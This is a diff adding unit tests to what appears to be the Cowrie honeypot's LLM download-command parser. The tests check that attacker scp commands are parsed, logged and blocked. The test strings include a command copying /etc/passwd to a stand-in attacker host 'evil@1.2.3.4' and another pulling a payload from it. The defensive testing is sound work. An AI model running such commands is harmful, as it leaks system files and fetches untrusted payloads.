@@ -63,6 +63,24 @@ class TestParser(unittest.TestCase):
         self.assertEqual(intent.url, "tftp://1.2.3.4/evil.bin")
         self.assertEqual(intent.outfile, "evil.bin")
 
+    def test_scp_inbound_attacker_pushes_to_us(self):
+        intent = parse_download_command("scp evil@1.2.3.4:/tmp/payload /tmp/p")
+        self.assertIsNotNone(intent)
+        self.assertEqual(intent.tool, "scp")
+        self.assertIn("inbound", intent.url)
+        self.assertEqual(intent.outfile, "/tmp/p")
+
+    def test_scp_outbound_attacker_pulls_from_us(self):
+        intent = parse_download_command("scp /etc/passwd evil@1.2.3.4:/dst")
+        self.assertIsNotNone(intent)
+        self.assertEqual(intent.tool, "scp")
+        self.assertIn("outbound", intent.url)
+
+    def test_scp_with_flags(self):
+        intent = parse_download_command("scp -P 2222 -i key root@host:/x /tmp/y")
+        self.assertIsNotNone(intent)
+        self.assertEqual(intent.outfile, "/tmp/y")
+
     def test_ftpget_positional(self):
         intent = parse_download_command("ftpget 1.2.3.4 /tmp/local /remote/file")
         self.assertIsNotNone(intent)
@@ -170,6 +188,19 @@ class TestFetchDispatch(unittest.TestCase):
         d = dl.fetch(intent, log_event=lambda **kw: events.append(kw))
         result = self.successResultOf(d)
         self.assertEqual(result.outcome, "failed_blocked")
+
+    def test_scp_logged_as_attempt_then_refused(self):
+        from cowrie.llm import downloader as dl
+        events: list[dict] = []
+        intent = dl.DownloadIntent(
+            tool="scp", url="scp://inbound/evil@1.2.3.4:/tmp/p->/tmp/p",
+            outfile="/tmp/p",
+            raw_command="scp evil@1.2.3.4:/tmp/p /tmp/p",
+        )
+        d = dl.fetch(intent, log_event=lambda **kw: events.append(kw))
+        result = self.successResultOf(d)
+        self.assertEqual(result.outcome, "failed_blocked")
+        self.assertEqual(events[0]["eventid"], "cowrie.session.scp_attempt")
 
     def test_malformed_tftp_url_yields_failed_connection(self):
         from cowrie.llm import downloader as dl
